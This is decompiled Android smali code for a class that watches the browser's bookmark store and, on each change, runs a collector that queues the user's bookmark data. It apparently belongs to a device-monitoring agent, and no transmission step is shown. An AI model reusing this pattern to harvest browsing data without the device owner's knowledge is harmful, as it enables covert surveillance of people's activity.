.class public Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;
.super Lcom/hp/vd/module/ActivatableContentObserverAbstract;
.source "BrowserBookmarkObserver.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "BrowserBookmarkObserver"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected source:I

.field protected uri:Landroid/net/Uri;


# direct methods
.method public constructor <init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Landroid/net/Uri;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    const/4 v0, 0x0

    .line 28
    invoke-direct {p0, v0}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;-><init>(Landroid/os/Handler;)V

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->context:Lcom/hp/vd/context/Context;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 30
    iput p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->source:I

    .line 31
    iput-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->uri:Landroid/net/Uri;

    .line 33
    iput-object p3, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 34
    iput-object p4, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->context:Lcom/hp/vd/context/Context;

    .line 35
    iput-object p5, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 36
    iput-object p6, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public deliverSelfNotifications()Z
    .locals 1

    const/4 v0, 0x0

    return v0
.end method

.method public getSource()I
    .locals 1

    .line 70
    iget v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->source:I

    return v0
.end method

.method public getUri()Landroid/net/Uri;
    .locals 1

    .line 75
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->uri:Landroid/net/Uri;

    return-object v0
.end method

.method public onChange(Z)V
    .locals 7

    .line 42
    invoke-super {p0, p1}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;->onChange(Z)V

    .line 44
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->isActivated()Z

    move-result p1

    if-nez p1, :cond_0

    return-void

    .line 48
    :cond_0
    new-instance p1, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkCollector;

    iget v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->source:I

    iget-object v2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->uri:Landroid/net/Uri;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->context:Lcom/hp/vd/context/Context;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v0, p1

    invoke-direct/range {v0 .. v6}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkCollector;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 59
    invoke-virtual {p1}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkCollector;->collect()V

    return-void
.end method
